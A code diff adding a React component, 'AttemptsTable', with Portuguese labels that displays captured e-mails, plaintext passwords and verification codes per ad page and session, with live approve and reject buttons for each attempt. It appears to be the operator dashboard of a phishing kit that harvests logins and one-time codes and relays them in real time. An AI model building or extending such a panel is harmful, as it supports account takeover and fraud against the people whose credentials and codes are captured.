@@ -407,3 +407,137 @@ function StatCard({
     </div>
   );
 }
+
+function AttemptsTable({
+  rows,
+  leads,
+  adTitles,
+  actionable,
+  busy,
+  onAction,
+}: {
+  rows: AttemptRow[];
+  leads: LeadRow[];
+  adTitles: Record<string, { title: string; slug: string }>;
+  actionable: boolean;
+  busy: string | null;
+  onAction: (row: AttemptRow, action: "approve" | "reject") => void;
+}) {
+  return (
+    <div className="overflow-x-auto">
+      <table className="w-full text-sm">
+        <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
+          <tr>
+            <th className="px-4 py-3 text-left font-medium">Hora</th>
+            <th className="px-4 py-3 text-left font-medium">Anúncio</th>
+            <th className="px-4 py-3 text-left font-medium">
+              <span className="inline-flex items-center gap-1">
+                <Mail className="h-3 w-3" /> E-mail
+              </span>
+            </th>
+            <th className="px-4 py-3 text-left font-medium">
+              <span className="inline-flex items-center gap-1">
+                <KeyRound className="h-3 w-3" /> Senha
+              </span>
+            </th>
+            <th className="px-4 py-3 text-left font-medium">
+              <span className="inline-flex items-center gap-1">
+                <Hash className="h-3 w-3" /> Código
+              </span>
+            </th>
+            <th className="px-4 py-3 text-left font-medium">Dispositivo</th>
+            <th className="px-4 py-3 text-left font-medium">Status</th>
+            {actionable && <th className="px-4 py-3 text-right font-medium">Ações</th>}
+          </tr>
+        </thead>
+        <tbody>
+          {rows.map((row) => {
+            const ua = leads.find((l) => l.session_id === row.session_id)?.user_agent ?? null;
+            const ad = adTitles[row.ad_id];
+            return (
+              <tr
+                key={row.key}
+                className={`border-t border-border transition-colors ${
+                  actionable ? "bg-primary/5" : "hover:bg-muted/30"
+                }`}
+              >
+                <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
+                  {formatTime(row.codeAt)}
+                </td>
+                <td className="px-4 py-3 text-xs">
+                  {ad ? (
+                    <div className="flex flex-col">
+                      <span className="truncate font-medium">{ad.title}</span>
+                      <span className="truncate font-mono text-[10px] text-muted-foreground">/{ad.slug}</span>
+                    </div>
+                  ) : (
+                    <span className="text-muted-foreground">—</span>
+                  )}
+                </td>
+                <td className="break-all px-4 py-3 font-mono text-xs">{row.email}</td>
+                <td className="break-all px-4 py-3 font-mono text-xs">{row.password}</td>
+                <td className="px-4 py-3 font-mono text-sm tracking-widest">{row.code}</td>
+                <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">{deviceLabel(ua)}</td>
+                <td className="whitespace-nowrap px-4 py-3 text-xs">
+                  {row.status === "approve" && (
+                    <span className="inline-flex items-center gap-1 rounded-full bg-success/15 px-2 py-0.5 text-success">
+                      <Check className="h-3 w-3" /> aprovado
+                    </span>
+                  )}
+                  {row.status === "reject" && (
+                    <span className="inline-flex items-center gap-1 rounded-full bg-destructive/15 px-2 py-0.5 text-destructive">
+                      <X className="h-3 w-3" /> rejeitado
+                    </span>
+                  )}
+                  {row.status === "pending" && actionable && (
+                    <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
+                      ⏳ aguardando
+                    </span>
+                  )}
+                  {row.status === "pending" && !actionable && (
+                    <span className="text-muted-foreground">— ignorado</span>
+                  )}
+                </td>
+                {actionable && (
+                  <td className="px-4 py-3 text-right">
+                    <div className="flex justify-end gap-1.5">
+                      <Button
+                        size="sm"
+                        className="h-8 bg-success px-3 text-success-foreground hover:bg-success/90"
+                        onClick={() => onAction(row, "approve")}
+                        disabled={busy === `${row.key}-approve`}
+                      >
+                        {busy === `${row.key}-approve` ? (
+                          <Loader2 className="h-3.5 w-3.5 animate-spin" />
+                        ) : (
+                          <>
+                            <Check className="mr-1 h-3.5 w-3.5" /> Aprovar
+                          </>
+                        )}
+                      </Button>
+                      <Button
+                        size="sm"
+                        variant="outline"
+                        className="h-8 border-destructive/40 px-3 text-destructive hover:bg-destructive/10"
+                        onClick={() => onAction(row, "reject")}
+                        disabled={busy === `${row.key}-reject`}
+                      >
+                        {busy === `${row.key}-reject` ? (
+                          <Loader2 className="h-3.5 w-3.5 animate-spin" />
+                        ) : (
+                          <>
+                            <X className="mr-1 h-3.5 w-3.5" /> Rejeitar
+                          </>
+                        )}
+                      </Button>
+                    </div>
+                  </td>
+                )}
+              </tr>
+            );
+          })}
+        </tbody>
+      </table>
+    </div>
+  );
+}
